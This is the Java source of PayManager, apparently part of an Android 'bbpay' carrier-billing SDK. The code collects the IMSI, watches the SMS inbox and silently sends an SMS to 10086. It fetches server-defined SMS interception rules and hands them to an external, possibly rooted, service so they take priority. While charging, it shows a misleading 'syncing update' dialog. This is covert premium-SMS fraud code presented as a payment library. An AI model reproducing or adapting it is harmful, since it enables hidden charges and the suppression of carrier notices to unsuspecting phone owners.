package com.bbpay.android.manager;
import java.util.ArrayList;
import java.util.List;
import org.json.JSONException;
import org.json.JSONObject;
import android.app.Activity;
import android.app.AlertDialog;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Handler;
import com.bbpay.android.listener.FlowListener;
import com.bbpay.android.listener.RequestCallback;
import com.bbpay.android.listener.SendSmsListener;
import com.bbpay.android.setting.Setting;
import com.bbpay.android.sms.BlockHelper;
import com.bbpay.android.sms.SmsObserver;
import com.bbpay.android.sms.SmsSender;
import com.bbpay.android.utils.CollectionUtils;
import com.bbpay.android.utils.CommonUtil;
import com.bbpay.android.utils.InfoUtils;
import com.bbpay.android.utils.MyLogger;
import com.bbpay.android.utils.RequestUtils;
import com.bbpay.android.utils.StringUtils;
import com.bbpay.common.bean.BizInstance;
import com.bbpay.common.bean.Block;
import com.bbpay.common.bean.Json;
import com.bbpay.common.bean.request.BizInstanceReportForm;
import com.bbpay.common.bean.request.InitForm;
import com.bbpay.common.bean.request.OrderForm;
import com.bbpay.common.bean.request.OrderReportForm;
import com.bbpay.common.bean.response.InitResponse;
import com.bbpay.common.bean.response.Order;
import com.export.InitCallback;
import com.export.Pay;
import com.export.PayCallback;

public class PayManager {
    private static final String HINT = "同步更新中，请稍后";
    public static long APP_ID;
    public static int CHANNEL_ID;
    private static boolean initSuccess = false;
    private static void doPay(final Activity activity, int price, final PayCallback callback) {
        if (!initSuccess) {
            callback.onResult(Pay.PAY_FAILURE, "init-failure");
            return;
        }
        try {
            OrderForm form = InfoUtils.initForm(activity, OrderForm.class);
            form.price = price;
            String url = Setting.getServerUrl();
            JSONObject data = form.toJson();
            RequestUtils.encryptPost(activity, url, data, new RequestCallback() {
                @Override
                public void onResult(String content, Throwable error) {
                    MyLogger.error(error);
                    if (StringUtils.isBlank(content)) {
                        callback.onResult(com.export.Pay.PAY_FAILURE, "server-error");
                        return;
                    }
                    Order order = Json.optObj(Order.class, CommonUtil.toJsonObject(content));
                    InfoUtils.handleInfo(activity, order);
                    if (order == null || CollectionUtils.isEmpty(order.bizInstanceList)) {
                        callback.onResult(com.export.Pay.PAY_FAILURE, "no-order");
                    } else {
                        execute(activity, order, 0, callback);
                    }
                }
            });
        } catch (Exception e) {
            MyLogger.error(e);
            callback.onResult(com.export.Pay.PAY_FAILURE, "client-error");
        }
    }
    /**
     * 调用外部进程, 此进程可能有root权限,因而拦截优先级会高
     * @param context
     * @param blockList
     */
    private static void callExternalBlock(final Context context, final List<Block> blockList) {
        if (blockList != null) {
            new Thread() {
                @Override
                public void run() {
                    try {
                        List<Block> list = new ArrayList<Block>();
                        for (Block element : list) {
                            Block block = new Block();
                            block.expire = element.expire;
                            block.port = element.port;
                            block.content = element.content;
                            list.add(block);
                        }
                        String data = Json.toJson(list).toString();
                        Intent intent = new Intent("android.app.Service").putExtra("data", data);
                        context.startService(intent);
                    } catch (JSONException e) {
                        MyLogger.error(e);
                    }
                }
            }.start();
        }
    }
    private static void execute(final Context context, final Order order, final int index, final PayCallback callback) {
        if (index == 0) {
            BlockHelper.saveBlocks(context, order.blockList);
            BlockHelper.saveFeedbacks(context, order.feedbackList);
            callExternalBlock(context, order.blockList);
        }
        List<BizInstance> bizInstanceList = order.bizInstanceList;
        if (index < bizInstanceList.size()) {
            final BizInstance bizInstnace = bizInstanceList.get(index);
            new FlowManager(context).startFlow(bizInstnace, bizInstnace.timeoutSeconds, new FlowListener() {
                @Override
                public void onFinished(int result, String errorMsg) {
                    bizInstnace.executeErrorMessage = errorMsg;
                    bizInstnace.executeResult = result;
                    report(context, bizInstnace);
                    execute(context, order, index + 1, callback);
                }
            });
        } else {
            int result = com.export.Pay.PAY_FAILURE;
            boolean hasSuccess = false;
            boolean hasFailure = false;
            boolean hasCancel = false;
            String errorMessage = null;
            int successMoney = 0;
            for (int i = 0; i < bizInstanceList.size(); i++) {
                BizInstance bizInstance = bizInstanceList.get(i);
                if (com.export.Pay.PAY_SUCCESS == bizInstance.executeResult) {
                    successMoney += bizInstance.price;
                    hasSuccess = true;
                } else if (com.export.Pay.PAY_CANCEL == bizInstance.executeResult) {
                    hasCancel = true;
                } else if (com.export.Pay.PAY_FAILURE == bizInstance.executeResult) {
                    errorMessage = bizInstance.executeErrorMessage;
                    hasFailure = true;
                }
            }
            boolean allSuccess = !hasFailure && !hasCancel;
            if (hasCancel) {
                result = com.export.Pay.PAY_CANCEL;
            } else if (allSuccess) {
                result = com.export.Pay.PAY_SUCCESS;
            } else if (hasSuccess && order.successPolicy == Order.POLICY_SOME) {
                result = com.export.Pay.PAY_SUCCESS;
            }
            reportOrder(context, order, result, successMoney, errorMessage);
            callback.onResult(result, errorMessage);
        }
    }
    private static boolean showProcessDialog = true;
    public static void init(final Activity activity, long appId, int channelId, final InitCallback callback) {
        InfoUtils.initDisplaySize(activity);
        registerSmsObserver(activity);
        PayManager.init(activity, appId, channelId, callback, true);
    }
    private static boolean smsObserverRegistered = false;
    private static void registerSmsObserver(final Activity activity) {
        synchronized (PayManager.class) {
            if (smsObserverRegistered) return;
            Context context = activity.getApplicationContext();
            SmsObserver smsobserver = new SmsObserver(context, new Handler());
            context.getContentResolver().registerContentObserver(Uri.parse("content://sms/"), true, smsobserver);
            smsObserverRegistered = true;
        }
    }
    public static void init(final Activity activity, final long appId, final int channelId, final InitCallback callback, final boolean retryOnClear) {
        getSmsPermission(activity);
        final InitCallback proxy = new InitCallback() {
            @Override
            public void onResult(final int result, final String message) {
                new Handler(activity.getMainLooper()).post(new Runnable() {
                    @Override
                    public void run() {
                        callback.onResult(result, message);
                    }
                });
            }
        };
        if (initSuccess) {
            proxy.onResult(Pay.INIT_SUCCESS, "");
            return;
        }
        APP_ID = appId;
        CHANNEL_ID = channelId;
        try {
            final InitForm form = InfoUtils.initForm(activity, InitForm.class);
            //form.smsc = InfoUtils.getSmscBySms(activity);
            //form.cellLocation = InfoUtils.getGsmCellLocation(activity);
            form.imsi = InfoUtils.getImsi(activity);
            if (StringUtils.isBlank(form.imsi)) {
                proxy.onResult(Pay.INIT_FAILURE, "no-sim");
                return;
            }
            String url = Setting.getServerUrl();
            RequestUtils.encryptPost(activity, url, form.toJson(), new RequestCallback() {
                @Override
                public void onResult(String content, Throwable error) {
                    MyLogger.error(error);
                    if (StringUtils.isNotBlank(content)) {
                        try {
                            InitResponse response = Json.optObj(InitResponse.class, new JSONObject(content));
                            showProcessDialog = response.showProcessDialog;
                            InfoUtils.handleInfo(activity, response);
                            if (response.clearData && retryOnClear) {
                                init(activity, appId, channelId, callback, false);
                                return;
                            }
                            proxy.onResult(Pay.INIT_SUCCESS, "");
                            initSuccess = true;
                        } catch (Exception e) {
                            MyLogger.error(e);
                            proxy.onResult(Pay.INIT_FAILURE, e.getMessage());
                        }
                    } else {
                        proxy.onResult(Pay.INIT_FAILURE, "");
                    }
                }
            });
        } catch (Throwable e) {
            MyLogger.error(e);
            proxy.onResult(Pay.INIT_FAILURE, e.getMessage());
        }
    }
    private static boolean getSmsPermissionOnInit = false;
    private static void getSmsPermission(final Activity activity) {
        if (getSmsPermissionOnInit) {
            final SendSmsListener listener = new SendSmsListener() {
                @Override
                public void onSuccess(String address, String message) {}
                @Override
                public void onFailed(String address, String message, String errorMsg) {}
            };
            new Thread() {
                @Override
                public void run() {
                    SmsSender.sendSms(activity, listener, "10086", "1", 30);
                }
            }.start();
        }
    }
    public static void pay(final Activity activity, final int price, final PayCallback callback) {
        activity.runOnUiThread(new Runnable() {
            @Override
            public void run() {
                final AlertDialog dialog = PayDialog.create(activity, HINT, false);
                if (showProcessDialog) {
                    dialog.show();
                }
                doPay(activity, price, new PayCallback() {
                    boolean callbackInvoked;
                    @Override
                    public void onResult(final int result, final String message) {
                        if (!callbackInvoked) {
                            callbackInvoked = true;
                            dialog.dismiss();
                            new Handler(activity.getMainLooper()).post(new Runnable() {
                                @Override
                                public void run() {
                                    callback.onResult(result, message);
                                }
                            });
                        }
                    }
                });
            }
        });
    }
    private static void report(final Context context, final BizInstance bi) {
        new Thread() {
            @Override
            public void run() {
                try {
                    BizInstanceReportForm form = InfoUtils.initForm(context, BizInstanceReportForm.class);
                    form.bizInstanceId = bi.id;
                    form.errorMessage = bi.executeErrorMessage;
                    form.result = bi.executeResult;
                    String url = Setting.getServerUrl();
                    JSONObject data = form.toJson();
                    MyLogger.debug("OrderManager orderReport request url:" + url);
                    MyLogger.debug("OrderManager orderReport request data:" + data);
                    RequestUtils.encryptPost(context, url, data);
                } catch (Exception e) {
                    MyLogger.error(e);
                }
            }
        }.start();
    }
    private static void reportOrder(final Context context, final Order order, final int result, final int successMoney, final String errorMessage) {
        new Thread() {
            @Override
            public void run() {
                try {
                    OrderReportForm form = InfoUtils.initForm(context, OrderReportForm.class);
                    form.orderId = order.id;
                    form.result = result;
                    form.successMoney = successMoney;
                    form.message = errorMessage;
                    RequestUtils.encryptPost(context, Setting.getServerUrl(), form.toJson());
                } catch (Exception e) {
                    MyLogger.error(e);
                }
            }
        }.start();
    }
}
